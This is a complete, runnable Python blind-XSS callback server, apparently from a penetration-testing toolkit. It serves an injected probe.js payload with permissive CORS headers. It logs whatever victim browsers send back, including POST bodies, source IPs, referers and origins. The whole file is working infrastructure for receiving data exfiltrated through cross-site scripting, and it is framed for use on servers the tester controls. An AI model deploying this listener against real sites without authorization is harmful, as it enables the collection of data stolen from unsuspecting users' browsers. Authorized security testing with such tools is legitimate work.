#!/usr/bin/env python3
"""Minimal blind-XSS callback listener for infrastructure YOU control.

Usage:
  bxss_listener.py --dir artifacts/xss/files --port 8000 [--bind 0.0.0.0] [--log artifacts/xss/blind_hits.jsonl]

Serves probe.js (from xss_files.py --callback) at /p.js with a JavaScript content type and permissive CORS so
<script src>, import() and XHR all work, and logs POSTs to /c plus any other request (DNS/HTTP-only beacons).
Put it behind your own TLS front end (or use interactsh / a self-hosted XSS Hunter instead).
Each hit is logged with time, source IP, path, headers subset and body (truncated to 4 KB).
"""
import argparse
import json
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dir", required=True, help="directory containing probe.js")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--bind", default="127.0.0.1")
    ap.add_argument("--log", default="artifacts/xss/blind_hits.jsonl")
    a = ap.parse_args()
    probe = os.path.join(a.dir, "probe.js")
    if not os.path.isfile(probe):
        raise SystemExit(f"{probe} not found - run xss_files.py --callback first")
    os.makedirs(os.path.dirname(a.log) or ".", exist_ok=True)

    class H(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def record(self, body=b""):
            hit = {"time": time.strftime("%Y-%m-%dT%H:%M:%S"), "ip": self.client_address[0], "method": self.command,
                   "path": self.path[:500], "ua": self.headers.get("User-Agent", ""),
                   "referer": self.headers.get("Referer", ""), "origin": self.headers.get("Origin", ""),
                   "body": body[:4096].decode("utf-8", "replace")}
            with open(a.log, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(hit) + "\n")
            print(f"[hit] {hit['time']} {hit['ip']} {hit['method']} {hit['path'][:80]} ref={hit['referer'][:60]}")

        def send(self, code, body, ctype="text/plain"):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_OPTIONS(self):
            self.send(204, b"")

        def do_GET(self):
            self.record()
            if self.path.split("?")[0] == "/p.js":
                with open(probe, "rb") as fh:
                    return self.send(200, fh.read(), "application/javascript")
            self.send(200, b"ok")

        def do_POST(self):
            n = min(int(self.headers.get("Content-Length", 0) or 0), 65536)
            self.record(self.rfile.read(n))
            self.send(200, b"ok")

    print(f"[*] listening on {a.bind}:{a.port}, serving {probe}, logging to {a.log}")
    ThreadingHTTPServer((a.bind, a.port), H).serve_forever()


if __name__ == "__main__":
    main()
